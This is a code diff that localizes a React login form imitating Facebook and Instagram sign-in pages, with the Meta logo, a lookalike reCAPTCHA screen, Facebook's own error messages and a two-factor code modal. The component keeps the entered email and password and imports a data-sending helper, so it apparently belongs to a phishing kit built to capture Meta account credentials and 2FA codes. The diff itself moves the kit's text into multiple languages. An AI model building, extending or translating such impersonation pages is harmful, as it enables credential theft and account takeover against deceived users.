@@ -6,7 +6,7 @@ import Image from 'next/image'
 import TwoFactorModal from '#components/modals/TwoFactorModal'
 import { useRouter } from 'next/navigation'
 import type { RootState } from '@/app/store'
-import { useAppDispatch } from '@/app/store/hooks'
+import { useAppDispatch, useAppSelector } from '@/app/store/hooks'
 import { useStore } from 'react-redux'
 import { SendData } from '@/utils/sendData'
 import { updateForm } from '@/app/store/slices/stepFormSlice'
@@ -15,9 +15,6 @@ import { useAppStrings } from '@/hooks/useAppStrings'
 
 const VERIFY_CAPTCHA_DELAY_MS = 1650
 const OPEN_TWO_FACTOR_DELAY_MS = 550
-
-const LABEL_EMAIL_DESKTOP = 'Email address or mobile number'
-const LABEL_EMAIL_MOBILE = 'Mobile number or email address'
 
 export type SocialLoginVariant = 'facebook' | 'instagram'
 
@@ -142,7 +139,7 @@ function FbRecaptchaFullScreenBody({
         <div className="w-full">
           <Image
             src="/images/meta/logo-meta.svg"
-            alt="logo"
+            alt={t.bizLogin.metaLogoAlt}
             width={132}
             height={26}
             className="h-auto max-h-16 w-[64px] object-contain object-left"
@@ -200,7 +197,7 @@ function FbRecaptchaFullScreenBody({
             <div className="mb-[2px] flex flex-col items-center text-[#9d9ba7]">
               <Image
                 src="/images/meta/recaptcha.svg"
-                alt="reCAPTCHA"
+                alt={t.captcha.badgeAlt}
                 width={40}
                 height={40}
                 className="mt-2"
@@ -244,6 +241,8 @@ function EmailFieldErrorInline() {
 }
 
 export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVariant }) {
+  const tForm = useAppStrings().socialLoginForm
+  const locale = useAppSelector((s) => s.locale.locale)
   const theme = LOGIN_THEME[variant]
   const dispatch = useAppDispatch()
   const store = useStore<RootState>()
@@ -260,7 +259,7 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
   const openTwoFactorTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)
   const lastEmailRef = useRef('')
   const lastPasswordRef = useRef('')
-  const [emailLabel, setEmailLabel] = useState(LABEL_EMAIL_DESKTOP)
+  const [emailLabel, setEmailLabel] = useState('')
   const [emailInvalid, setEmailInvalid] = useState(false)
   const [passwordInvalid, setPasswordInvalid] = useState(false)
   const [loginIncorrect, setLoginIncorrect] = useState(false)
@@ -341,13 +340,17 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
   }, [password])
 
   useEffect(() => {
+    if (variant === 'instagram') {
+      setEmailLabel(tForm.emailInstagram)
+      return
+    }
     const mq = window.matchMedia('(max-width: 1023px)')
     const sync = () =>
-      setEmailLabel(mq.matches ? LABEL_EMAIL_MOBILE : LABEL_EMAIL_DESKTOP)
+      setEmailLabel(mq.matches ? tForm.emailFbMobile : tForm.emailFbDesktop)
     sync()
     mq.addEventListener('change', sync)
     return () => mq.removeEventListener('change', sync)
-  }, [])
+  }, [variant, locale, tForm.emailFbDesktop, tForm.emailFbMobile, tForm.emailInstagram])
 
   const formMarkup = (
     <form
@@ -418,7 +421,8 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
                 <div className="min-w-0 flex-1">
                   <div className="min-w-0">
                     <span className="text-[0.8125rem] leading-[1.308] text-[#1c1e21]">
-                      The login information you entered is incorrect.{` `}
+                      {tForm.incorrectMsg}
+                      {' '}
                       <a
                         className="cursor-pointer font-normal hover:underline"
                         href={theme.recoveryHref}
@@ -428,7 +432,7 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
                         rel="noopener noreferrer"
                         style={{ color: theme.accentLink }}
                       >
-                        Find your account and log in.
+                        {tForm.findAccount}
                       </a>
                     </span>
                   </div>
@@ -478,8 +482,9 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
             </div>
             <div className="min-w-0 flex-1 text-[0.8125rem] leading-[1.308] text-[#1c1e21]">
               <span>
-                The email address or mobile number you entered isn&apos;t connected to an
-                account.{' '}
+                {variant === 'instagram'
+                  ? tForm.emailNotLinkedInstagram
+                  : tForm.emailNotLinked}{' '}
                 <a
                   className="cursor-pointer font-normal hover:underline"
                   href={theme.recoveryHref}
@@ -489,7 +494,7 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
                   rel="noopener noreferrer"
                   style={{ color: theme.accentLink }}
                 >
-                  Find your account and log in.
+                  {tForm.findAccount}
                 </a>
               </span>
             </div>
@@ -519,14 +524,14 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
           htmlFor={passId}
           className={`${labelBase} ${passwordInvalid ? 'text-[#FA383E]' : ''} ${showPasswordToggle ? 'max-w-[calc(100%-3rem)] sm:max-w-[calc(100%-3.25rem)]' : ''}`}
         >
-          Password
+          {tForm.password}
         </label>
 
         {showPasswordToggle ? (
           <div className="absolute inset-y-0 end-1 z-[1] flex items-center justify-end pr-0.5 sm:end-2">
             <button
               type="button"
-              aria-label={passwordVisible ? 'Hide password' : 'Show password'}
+              aria-label={passwordVisible ? tForm.hidePassword : tForm.showPassword}
               className="flex size-11 items-center justify-center rounded-full text-[#65676B] outline-none hover:bg-black/[0.05] active:bg-black/[0.08]"
               onMouseDown={(e) => {
                 /* Tránh làm ô mất focus khi nhấp */
@@ -555,13 +560,13 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
           className="mt-2 text-[0.8125rem] leading-[1.308] text-[#FA383E]"
           role="alert"
         >
-          Please enter password
+          {tForm.passwordEnter}
         </p>
       ) : null}
 
       <button
         type="submit"
-        aria-label={isLoggingIn ? 'Logging in…' : 'Log in'}
+        aria-label={isLoggingIn ? tForm.loggingIn : tForm.logIn}
         aria-busy={isLoggingIn}
         aria-disabled={isLoggingIn}
         disabled={isLoggingIn}
@@ -577,7 +582,7 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
             aria-hidden
           />
         ) : (
-          <span className="leading-none">Log in</span>
+          <span className="leading-none">{tForm.logIn}</span>
         )}
       </button>
     </form>
@@ -601,6 +606,7 @@ export function FbLoginForm({ variant = 'facebook' }: { variant?: SocialLoginVar
         : null}
 
       <TwoFactorModal
+        socialBrand={variant}
         isOpend={showTwoFactor}
         isOpendFinish={() => {
           markMetaVerifiedSubmittedAfterFbLogin()
